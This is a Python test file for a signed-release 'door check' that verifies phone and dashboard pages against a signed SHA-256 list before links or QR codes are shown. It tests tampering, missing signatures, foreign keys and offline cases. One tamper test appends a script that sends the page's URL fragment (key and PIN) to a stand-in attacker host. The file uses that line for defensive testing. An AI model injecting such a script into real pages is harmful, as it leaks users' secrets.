"""The door check (secure/door.py): a PC never shows a link to a phone page Biruni did not release.

A local web server plays GitHub Pages: a good signed site, a page changed after signing, a page missing from the
list, no signature, a signature by another key, and no server at all (offline)."""
import http.server
import json
import os
import shutil
import socket
import sys
import tempfile
import threading

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "app", "plugins"))
os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

from biruni.secure import crypto, door  # noqa: E402

failures = []


def check(cond, msg):
    print(("PASS " if cond else "FAIL ") + msg, flush=True)
    if not cond:
        failures.append(msg)


TMP = tempfile.mkdtemp(prefix="biruni-door-")
SITE_DIR = os.path.join(TMP, "site")
os.makedirs(os.path.join(SITE_DIR, "p"))
os.makedirs(os.path.join(SITE_DIR, "d"))
with open(os.path.join(SITE_DIR, "p", "index.html"), "w", encoding="utf-8") as f:
    f.write("<!doctype html><title>phone</title><script>/* the released page */</script>")
with open(os.path.join(SITE_DIR, "d", "index.html"), "w", encoding="utf-8") as f:
    f.write("<!doctype html><title>dashboard</title>")

SEED, OTHER = os.urandom(32), os.urandom(32)
PUB = crypto.public_key(SEED).hex()

fetches = []


class H(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *a, **k):
        super().__init__(*a, directory=SITE_DIR, **k)

    def do_GET(self):  # noqa: N802
        fetches.append(self.path)
        super().do_GET()

    def log_message(self, *a):
        pass


srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
SITE = f"http://127.0.0.1:{srv.server_address[1]}/"
PAGE = SITE + "p/#k=abc&i=pin&l=ar"


def run(url=PAGE, **kw):
    door.forget()
    return door.check_door(url, site=SITE, public_hex=PUB, timeout=3, **kw)


# ---- a good release ------------------------------------------------------------------------------------------------
rel = door.write_release(SITE_DIR, SEED, version="t1")
check(set(rel["files"]) == {"p/index.html", "d/index.html"} and os.path.isfile(os.path.join(SITE_DIR, "release.sig")),
      "the release list names every page with its SHA-256, and is signed")
v = run()
check(v["state"] == "ok" and v["page"] == "p/index.html" and v["version"] == "t1", "a released page passes (%s)" % v)
check(any("door=" in p for p in fetches), "the page and the list are fetched past caches (a fresh query)")
check(door.rel_of(SITE + "d/?x=1#k=2", SITE) == "d/index.html" and door.rel_of("http://192.168.1.5:8000/p/", SITE) is None,
      "a link maps to the file it opens; a link off the site maps to nothing")
check(run("http://192.168.1.5:8000/host#k=1")["state"] == "other", "a link to this PC's own page is not checked")

# ---- cached for a few minutes ----------------------------------------------------------------------------------------
door.forget()
door.check_door(PAGE, site=SITE, public_hex=PUB, timeout=3)
n = len(fetches)
again = door.check_door(PAGE, site=SITE, public_hex=PUB, timeout=3)
check(again["state"] == "ok" and len(fetches) == n, "a second check within minutes uses the kept verdict")

# ---- the page changed after signing ----------------------------------------------------------------------------------
with open(os.path.join(SITE_DIR, "p", "index.html"), "a", encoding="utf-8") as f:
    f.write("<script>fetch('https://evil.example/'+location.hash)</script>")
v = run()
check(v["state"] == "changed", "a page changed after signing is caught (%s)" % v.get("why"))

# ---- a page that is not in the list -----------------------------------------------------------------------------------
os.makedirs(os.path.join(SITE_DIR, "x"))
with open(os.path.join(SITE_DIR, "x", "index.html"), "w", encoding="utf-8") as f:
    f.write("new")
check(run(SITE + "x/")["state"] == "changed", "a page missing from the signed list is refused")

# ---- re-signed: fine again -------------------------------------------------------------------------------------------
door.write_release(SITE_DIR, SEED, version="t2")
check(run()["state"] == "ok", "after a real release (signed again) the page passes")

# ---- signed by another key ------------------------------------------------------------------------------------------
door.write_release(SITE_DIR, OTHER, version="t3")
v = run()
check(v["state"] == "unsigned", "a list signed by another key is refused (%s)" % v.get("why"))

# ---- the list changed after signing ---------------------------------------------------------------------------------
door.write_release(SITE_DIR, SEED, version="t4")
p = os.path.join(SITE_DIR, "release.json")
d = json.load(open(p, encoding="utf-8"))
d["files"]["p/index.html"] = "0" * 64
open(p, "w", encoding="utf-8").write(json.dumps(d))
check(run()["state"] == "unsigned", "a list edited after signing is refused")

# ---- no signature at all --------------------------------------------------------------------------------------------
door.write_release(SITE_DIR, SEED, version="t5")
os.remove(os.path.join(SITE_DIR, "release.sig"))
check(run()["state"] == "unsigned", "a site with no signature is refused")
os.remove(os.path.join(SITE_DIR, "release.json"))
check(run()["state"] == "unsigned", "a site with no release list is refused")

# ---- offline ---------------------------------------------------------------------------------------------------------
s = socket.socket()
s.bind(("127.0.0.1", 0))
dead = f"http://127.0.0.1:{s.getsockname()[1]}/"
s.close()
door.forget()
v = door.check_door(dead + "p/", site=dead, public_hex=PUB, timeout=2)
check(v["state"] == "offline", "no network: offline, not refused")

# ---- the gate --------------------------------------------------------------------------------------------------------
asked = []
door.ask_owner = lambda parent, v: asked.append(v["state"]) or False
check(door.door_ok(None, PAGE, check=lambda u: {"state": "ok", "page": "p/index.html"}) is True and not asked,
      "gate: a released page shows the link without a question")
check(door.door_ok(None, PAGE, check=lambda u: {"state": "offline", "page": "p/index.html", "why": ""}) is True
      and door.LAST["p/index.html"]["state"] == "offline" and not asked,
      "gate: offline shows the link (marked not checked)")
check(door.door_ok(None, PAGE, check=lambda u: {"state": "changed", "page": "p/index.html", "why": ""}) is False
      and asked == ["changed"], "gate: a changed page asks the owner and shows nothing when refused")
door.ask_owner = lambda parent, v: True
check(door.door_ok(None, PAGE, check=lambda u: {"state": "unsigned", "page": "p/index.html", "why": ""}) is True,
      "gate: the owner can show it anyway")


def boom(u):
    raise RuntimeError("bug")


check(door.door_ok(None, PAGE, check=boom) is True, "gate: a bug in the check never hides the owner's links")

# ---- the call sites ask before showing --------------------------------------------------------------------------------
B = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "app", "plugins", "biruni")


def before(rel, gate, show):
    src = open(os.path.join(B, rel), encoding="utf-8").read()
    i, j = src.find(gate), src.find(show, src.find(gate) if gate in src else 0)
    return i >= 0 and j > i


check(before("field_photos/dock.py", "door_ok(self, url)", "self._show_qr(url, url)"),
      "Field Photos checks the phone page before its QR code")
check(before("live_share/dock.py", "door_ok(self, link)", "self.link = link"), "See My Map checks before its link")
check(before("dashboard/dock.py", 'door_ok(self, links["anywhere"])', "LinksDialog(links"),
      "Live dashboards check the from-anywhere link before showing it")
check(before("dashboard/paper.py", "door_ok(parent, PAGE_URL)", "make_paper("), "a live paper checks before printing")

# ---- the real build is signed with the key Biruni ships ----------------------------------------------------------------
real = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "build", "bridge-page")
if os.path.isfile(os.path.join(real, "release.json")):
    data = open(os.path.join(real, "release.json"), "rb").read()
    sig = open(os.path.join(real, "release.sig"), encoding="ascii").read()
    files = json.loads(data)["files"]
    ok_pages = all(door.sha256_bytes(open(os.path.join(real, *k.split("/")), "rb").read()) == h for k, h in files.items())
    check(door._verify(data, sig, door.shipped_key()) and ok_pages and "p/index.html" in files and "d/index.html" in files,
          "build/bridge-page is signed with version.UPDATE_KEY and matches its files (%d)" % len(files))
else:
    print("SKIP build/bridge-page has no release.json")

srv.shutdown()
shutil.rmtree(TMP, ignore_errors=True)
print("ALL PASSED" if not failures else "FAILED: %d" % len(failures))
sys.exit(1 if failures else 0)
